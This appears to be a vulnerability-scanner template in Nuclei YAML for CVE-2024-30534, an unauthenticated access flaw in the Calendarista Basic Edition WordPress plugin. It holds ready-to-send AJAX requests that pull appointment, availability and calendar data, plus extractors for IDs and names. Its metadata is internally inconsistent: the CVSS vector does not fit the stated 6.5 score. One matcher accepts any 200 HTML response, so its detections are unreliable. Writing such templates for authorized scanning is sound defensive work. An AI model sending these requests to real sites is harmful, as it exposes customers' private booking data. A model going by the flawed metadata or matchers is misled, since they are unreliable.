id: CVE-2024-30534

info:
  name: Calendarista Basic Edition <= 3.0.5 - Missing Authorization to AJAX Endpoints
  author: intelligent-ears
  severity: medium
  description: |
    The Calendarista Basic Edition plugin for WordPress is vulnerable to unauthorized access due to missing capability checks on AJAX endpoints in versions up to, and including, 3.0.5. This makes it possible for unauthenticated attackers to read sensitive appointment data, retrieve booking information, and access calendar availabilities without authentication.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/calendarista-basic-edition/calendarista-basic-edition-305-missing-authorization
    - https://patchstack.com/database/vulnerability/calendarista-basic-edition/wordpress-calendarista-basic-edition-plugin-3-0-5-broken-access-control-vulnerability
    - https://plugins.trac.wordpress.org/changeset/3032825/calendarista-basic-edition
    - https://nvd.nist.gov/vuln/detail/CVE-2024-30534
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 6.5
    cve-id: CVE-2024-30534
    cwe-id: CWE-862
    epss-score: 0.00043
    epss-percentile: 0.08385
    cpe: cpe:2.3:a:typps:calendarista:*:*:*:*:basic:wordpress:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: typps
    product: calendarista_basic_edition
    framework: wordpress
    publicdisclosure: 2024-03-29
  tags: cve,cve2024,wordpress,wp-plugin,calendarista,missing-authorization,unauth,ajax

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=calendarista_appointments_feed

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=calendarista_get_availabilities&projectId=1

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=calendarista_calendar_month_change&projectId=1&changeMonthYear=2026-01-01

    cookie-reuse: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: "successful-json-response"
        dsl:
          - "status_code == 200"
          - 'contains(body, "[]") || contains(body, "exclusions") || contains(body, "option")'
        condition: and

      - type: dsl
        name: "ajax-action-accessible"
        dsl:
          - "status_code == 200"
          - 'content_type == "text/html; charset=UTF-8"'
        condition: and

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"id":"?([0-9]+)"?'
          - 'value="([0-9]+)"'
          - '"name":"([^"]+)"'
